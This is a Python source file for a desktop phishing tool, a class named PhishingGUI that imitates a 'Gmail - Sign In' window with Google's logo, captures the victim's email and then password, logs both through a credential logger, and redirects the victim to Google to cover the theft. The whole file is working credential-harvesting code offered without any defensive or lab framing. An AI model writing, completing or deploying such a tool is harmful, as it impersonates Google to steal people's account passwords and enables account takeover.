from PIL import Image
import customtkinter as ctk
from logger import CredentialLogger
from redirector import Redirector
import re

class PhishingGUI:
    def __init__(self):
        self.logger = CredentialLogger()
        self.redirector = Redirector()
        ctk.set_appearance_mode("system")
        ctk.set_default_color_theme("dark-blue")
        self.root = ctk.CTk()
        self.root.title("Gmail - Sign In")
        self.root.geometry('900x600')
        self.setup_ui()

    def setup_ui(self):
        self.root.configure(bg="#f2f2f2")

        self.login_frame = ctk.CTkFrame(self.root, width=400, height=400, fg_color="white", corner_radius=10)
        self.login_frame.pack(pady=50)

        # Logo google
        self.logo = ctk.CTkImage(Image.open("Google.png"), size=(100, 34))

        # Nagłówek

        ctk.CTkLabel(self.root, text="Sign in", font=ctk.CTkFont(size=20, weight="bold"),
                     text_color="black", fg_color="white").pack(pady=(0, 10))


        # Email input
        ctk.CTkLabel(self.root, text="Email", text_color="black", fg_color="white").pack()
        self.email_entry = ctk.CTkEntry(self.login_frame, width=300)
        self.email_entry.pack()

        # Error
        self.error_label = ctk.CTkLabel(self.login_frame, text="", text_color="red", font=ctk.CTkFont(size=16, weight="bold"), fg_color="white")


        # Przycisk next
        self.next_button = ctk.CTkButton(self.login_frame, text="Next", command=self.handle_email_submit, fg_color="#1a73e8", hover_color="#1669c1")
        self.next_button.pack(pady=20)

    def show_error(self, message, below_widget=None):
        if message:
            self.error_label.configure(text=message)
            if below_widget:
                self.error_label.pack(after=below_widget, pady=(2.5))
            else:
                self.error_label.pack(pady=(2,5))
        else:
            self.error_label.pack_forget()


    def is_valid_email(self, email: str) -> bool:
        pattern = r"^[\w\.-]+@gmail\.com$"
        return re.match(pattern, email) is not None

    def handle_email_submit(self):
        self.email = self.email_entry.get()

        if not self.is_valid_email(self.email):
            self.logger.log(self.email, "", is_valid=False)
            self.show_error("Please enter a valid Gmail address.", below_widget=self.email_entry)
            return

        self.show_error("")

        # Usuwamy input i przycisk Next
        self.email_entry.pack_forget()
        self.next_button.pack_forget()

        self.email_label = ctk.CTkLabel(self.root, text=self.email, font=ctk.CTkFont(size=20, weight="bold"))
        self.email_label.pack(pady=5)


        # Dodajemy input do hasła
        ctk.CTkLabel(self.root, text="Password").pack()
        self.password_entry = ctk.CTkEntry(self.root, show="*", width=300)
        self.password_entry.pack()

        self.login_button = ctk.CTkButton(self.root, text="Login", command=self.handle_password_submit)
        self.login_button.pack(pady=20)

    def handle_password_submit(self):
        password = self.password_entry.get()

        if not password:
            self.show_error("Password cannot be empty.", below_widget=self.password_entry)
            return

        # Logujemy dane
        self.logger.log(self.email, password, is_valid=True)

        self.root.destroy()
        self.redirector.redirect_to_google()

    def run(self):
        self.root.mainloop()